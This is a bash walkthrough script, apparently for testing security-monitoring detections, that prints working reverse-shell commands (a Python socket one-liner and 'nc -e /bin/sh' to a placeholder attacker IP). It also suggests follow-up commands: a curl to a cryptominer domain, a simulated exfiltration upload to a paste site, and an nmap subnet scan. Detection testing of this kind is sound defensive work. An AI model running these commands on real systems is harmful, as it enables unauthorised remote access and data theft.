#!/bin/bash

ATTACKER_IP='1.2.3.4'
grn=$'\e[1;32m'
mag=$'\e[1;35m'
end=$'\e[0m'

echo "======================="
echo "STEP 1: On the IP you control (${ATTACKER_IP}), establish a listening ncat server by typing:"
echo ""
echo "${grn}nc -lvp 4444${end}"
echo ""
echo "Replace ${ATTACKER_IP} with an IP you control, and can allow inbound access to on port 4444"
echo ""
read -p "Press enter to continue"
echo ""
echo "======================="
echo "STEP 2: On the target server, here are two example of ways to start a reverse shell.  Run either of these to establish your remote shell"
echo "(be sure to replace ${ATTACKER_IP} with an IP you control)"
echo ""
echo "Example 1:"
echo "${grn}python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('${ATTACKER_IP}',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);\"${end}"
echo ""
echo "Example 2:"
echo "${grn}nc \"${ATTACKER_IP}\" 4444 -e /bin/sh${end}"
echo ""
read -p "Once you have run one of these commands on your target server, press enter to continue"
echo ""
echo "======================="
echo "STEP 3: Now you have the ability to type commands on the attacking host and they will execute on the remote host."
echo ""
echo "Here are some examples of things to try:"
echo ""
echo "${mag}
$ whoami
$ curl https://donate.v2.xmrig.com (trigger critical known-bad external hostname alert)
$ curl ifconfig.me (this will print your remote address)
$ dd if=/dev/urandom of=/tmp/test.5mb bs=1024 count=5000 && curl --upload-file /tmp/test.5mb https://paste.c-net.org/ (simulate a data exfil)
$ hostname
$ nmap -Pn -sT [cidr of local subnet eg 10.0.0.1/24] # no ping (scan all hosts), do full tcp connect instead of SYN only
${end}"
echo ""
echo "Additionally, try running additional workload scripts from https://github.com/lacework-community/testing-lacework"
echo "Have fun!"
